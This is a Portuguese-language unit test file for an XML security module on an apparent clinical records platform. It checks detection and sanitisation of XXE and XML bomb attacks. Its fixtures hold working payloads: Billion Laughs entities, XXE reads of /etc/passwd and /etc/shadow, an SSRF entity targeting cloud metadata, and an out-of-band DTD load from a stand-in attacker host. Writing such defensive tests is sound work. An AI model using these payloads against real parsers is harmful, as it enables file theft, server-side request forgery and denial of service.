/**
 * Testes Unitários do Motor de Segurança XML contra XXE e XML Bombs
 * (OWASP ASVS V5.5, CWE-611, CWE-776 & HL7/FHIR XML)
 */

import { describe, it, expect } from 'bun:test';
import {
  calculateXmlNestingDepth,
  analyzeEntityExpansionFactor,
  detectXmlThreats,
  sanitizeXmlString,
  parseSafeClinicalXml,
  createXmlProofSeal,
  verifyXmlProofSeal,
  scanAndSanitizeXml,
  DEFAULT_XML_GUARD_POLICY
} from '../src/xmlSecurityGuard';
import {
  XmlThreatType,
  XmlThreatSeverity,
  XmlSanitizationMode,
  XmlClinicalSchemaType
} from '@terapiainfoco/shared';

describe('XML Security Guard & XXE / XML Bomb Defense Engine (CWE-611 / CWE-776)', () => {
  describe('Análise Estrutural e Fator de Expansão Léxica', () => {
    it('deve calcular a profundidade de aninhamento de nós ignorando CDATA e comentários', () => {
      const xml = `
        <ClinicalDocument>
          <!-- Comentário ignorado -->
          <recordTarget>
            <patientRole>
              <patient>
                <name>Maria Oliveira</name>
                <![CDATA[ <nested><fake><tags></fake></nested> ]]>
              </patient>
            </patientRole>
          </recordTarget>
        </ClinicalDocument>
      `;

      const depth = calculateXmlNestingDepth(xml);
      expect(depth).toBe(5); // ClinicalDocument -> recordTarget -> patientRole -> patient -> name
    });

    it('deve identificar ausência de entidades em XML limpo', () => {
      const xml = '<Bundle><entry><resource><Patient><id value="123"/></Patient></resource></entry></Bundle>';
      const analysis = analyzeEntityExpansionFactor(xml);
      expect(analysis.detectedEntitiesCount).toBe(0);
      expect(analysis.isBillionLaughs).toBe(false);
      expect(analysis.expansionMultiplier).toBe(1);
    });

    it('deve detectar ataque Billion Laughs de expansão recursiva exponencial', () => {
      const xml = `<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol1 "&lol;&lol;">
          <!ENTITY lol2 "&lol1;&lol1;">
          <!ENTITY lol3 "&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;">
        ]>
        <lolz>&lol4;</lolz>
      `;

      const analysis = analyzeEntityExpansionFactor(xml);
      expect(analysis.detectedEntitiesCount).toBe(5);
      expect(analysis.isBillionLaughs).toBe(true);
      expect(analysis.expansionMultiplier).toBeGreaterThanOrEqual(16);
      expect(analysis.suspiciousEntities).toContain('lol1');
    });
  });

  describe('Detecção de Vetores de Injeção de Entidades Externas (XXE)', () => {
    it('deve detectar injeção de entidade externa local via SYSTEM file:// (exfiltração de arquivos)', () => {
      const xxeXml = `<?xml version="1.0"?>
        <!DOCTYPE clinical [
          <!ENTITY secret SYSTEM "file:///etc/passwd">
        ]>
        <clinicalData>
          <diagnosticReport>&secret;</diagnosticReport>
        </clinicalData>
      `;

      const result = detectXmlThreats(xxeXml);
      expect(result.threats.length).toBeGreaterThan(0);
      const threat = result.threats.find(t => t.threatType === XmlThreatType.EXTERNAL_ENTITY_SYSTEM);
      expect(threat).toBeDefined();
      expect(threat?.severity).toBe(XmlThreatSeverity.CRITICAL);
      expect(threat?.triggerSnippet).toContain('SYSTEM "file:///etc/passwd"');
    });

    it('deve detectar tentativa de SSRF via SYSTEM http:// em XML clínico', () => {
      const ssrfXml = `<?xml version="1.0"?>
        <!DOCTYPE doc [
          <!ENTITY cloud SYSTEM "http://169.254.169.254/latest/meta-data/">
        ]>
        <doc>&cloud;</doc>
      `;

      const result = detectXmlThreats(ssrfXml);
      const threat = result.threats.find(t => t.threatType === XmlThreatType.EXTERNAL_ENTITY_SYSTEM);
      expect(threat).toBeDefined();
      expect(threat?.severity).toBe(XmlThreatSeverity.CRITICAL);
    });

    it('deve detectar injeção de Parameter Entities para exfiltração Out-of-Band (OOB XXE)', () => {
      const oobXml = `<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % pe SYSTEM "http://attacker-server.com/evil.dtd">
          %pe;
        ]>
        <foo>data</foo>
      `;

      const result = detectXmlThreats(oobXml);
      const paramThreat = result.threats.find(t => t.threatType === XmlThreatType.PARAMETER_ENTITY_INJECTION);
      expect(paramThreat).toBeDefined();
      expect(paramThreat?.severity).toBe(XmlThreatSeverity.CRITICAL);
    });

    it('deve interceptar ataques de inclusão via XInclude', () => {
      const xincludeXml = `
        <ClinicalRecord xmlns:xi="http://www.w3.org/2001/XInclude">
          <patientId>98765</patientId>
          <xi:include href="file:///etc/shadow" parse="text"/>
        </ClinicalRecord>
      `;

      const result = detectXmlThreats(xincludeXml);
      const xincThreat = result.threats.find(t => t.threatType === XmlThreatType.XINCLUDE_ATTACK);
      expect(xincThreat).toBeDefined();
      expect(xincThreat?.severity).toBe(XmlThreatSeverity.HIGH);
    });

    it('deve detectar redirecionamento malicioso de schema externo (Schema Poisoning)', () => {
      const schemaXml = `
        <ClinicalDocument xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="urn:hl7-org:v3 http://malicious-external-host.com/evil.xsd">
          <title>Atestado Psicológico</title>
        </ClinicalDocument>
      `;

      const result = detectXmlThreats(schemaXml);
      const schemaThreat = result.threats.find(t => t.threatType === XmlThreatType.EXTERNAL_SCHEMA_REDIRECTION);
      expect(schemaThreat).toBeDefined();
    });

    it('deve detectar aninhamento excessivo acima da política permitida (Nesting Depth Bomb)', () => {
      // Cria 25 níveis de aninhamento com política maxNestingDepth = 15
      let nested = '<root>';
      for (let i = 0; i < 25; i++) nested += `<level${i}>`;
      nested += 'profundo';
      for (let i = 24; i >= 0; i--) nested += `</level${i}>`;
      nested += '</root>';

      const result = detectXmlThreats(nested, { ...DEFAULT_XML_GUARD_POLICY, maxNestingDepth: 15 });
      const depthThreat = result.threats.find(t => t.threatType === XmlThreatType.EXCESSIVE_NESTING_DEPTH);
      expect(depthThreat).toBeDefined();
    });
  });

  describe('Sanitização e Normalização Segura de XML', () => {
    it('deve remover declarações DOCTYPE completas mantendo tags clínicas limpas', () => {
      const dirtyXml = `<?xml version="1.0"?>
        <!DOCTYPE ClinicalDocument [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <ClinicalDocument>
          <title>Avaliação Psicológica</title>
          <author>Dr. Carlos Mendes</author>
        </ClinicalDocument>
      `;

      const cleaned = sanitizeXmlString(dirtyXml);
      expect(cleaned).not.toContain('<!DOCTYPE');
      expect(cleaned).not.toContain('SYSTEM');
      expect(cleaned).toContain('<title>Avaliação Psicológica</title>');
      expect(cleaned).toContain('<author>Dr. Carlos Mendes</author>');
    });

    it('deve preservar entidades padronizadas XML (&amp;, &lt;, &gt;) e remover entidades maliciosas', () => {
      const xmlWithEntities = '<obs>Paciente relatou ansiedade &amp; insônia &xxe; com nota &lt; 5</obs>';
      const cleaned = sanitizeXmlString(xmlWithEntities);
      expect(cleaned).toContain('&amp;');
      expect(cleaned).toContain('&lt;');
      expect(cleaned).not.toContain('&xxe;');
    });

    it('deve extrair campos clínicos essenciais via parseSafeClinicalXml', () => {
      const cleanXml = `
        <ClinicalDocument>
          <title>Relatório Psicológico Pericial</title>
          <patientName>Fernanda Lima</patientName>
          <diagnosisCid>F41.1</diagnosisCid>
        </ClinicalDocument>
      `;

      const data = parseSafeClinicalXml(cleanXml);
      expect(data.title).toBe('Relatório Psicológico Pericial');
      expect(data.patientName).toBe('Fernanda Lima');
      expect(data.diagnosisCid).toBe('F41.1');
      expect(data.detectedFormat).toBe(XmlClinicalSchemaType.HL7_CDA_R2);
    });
  });

  describe('Selo Probatório WORM RFC 8785 e Execução Completa', () => {
    it('deve emitir e validar selo probatório inviolável de higienização XML', () => {
      const seal = createXmlProofSeal('hash_xml_original', 'hash_xml_clean', 0, XmlClinicalSchemaType.HL7_CDA_R2);
      expect(seal.sealId).toStartWith('xml_guard_v1_');
      expect(seal.hmacSignature).toBeDefined();

      const verification = verifyXmlProofSeal(seal);
      expect(verification.isValid).toBe(true);
      expect(verification.parsedSeal?.schemaType).toBe(XmlClinicalSchemaType.HL7_CDA_R2);
    });

    it('deve rejeitar selo probatório com contagem adulterada ou assinatura forjada', () => {
      const seal = createXmlProofSeal('hash_xml_original', 'hash_xml_clean', 0, XmlClinicalSchemaType.HL7_CDA_R2);
      const tamperedSeal = { ...seal, threatsCount: 42 };

      const verification = verifyXmlProofSeal(tamperedSeal);
      expect(verification.isValid).toBe(false);
      expect(verification.reason).toContain('Assinatura HMAC');
    });

    it('deve processar documento ponta a ponta com scanAndSanitizeXml neutralizando ameaças', () => {
      const attackPayload = `<?xml version="1.0"?>
        <!DOCTYPE note [
          <!ENTITY xxe SYSTEM "file:///dev/random">
        ]>
        <note>
          <to>Psicólogo</to>
          <message>Consulta agendada &xxe;</message>
        </note>
      `;

      const result = scanAndSanitizeXml(
        attackPayload,
        XmlClinicalSchemaType.HL7_CDA_R2,
        XmlSanitizationMode.STRIP_DTD_AND_PARSE
      );

      expect(result.isSafe).toBe(false);
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.sanitizedXml).not.toContain('<!DOCTYPE');
      expect(result.sanitizedXml).toContain('<to>Psicólogo</to>');
      expect(result.parsedData?.to).toBe('Psicólogo');
      expect(result.seal.threatsCount).toBe(result.threats.length);
    });
  });
});
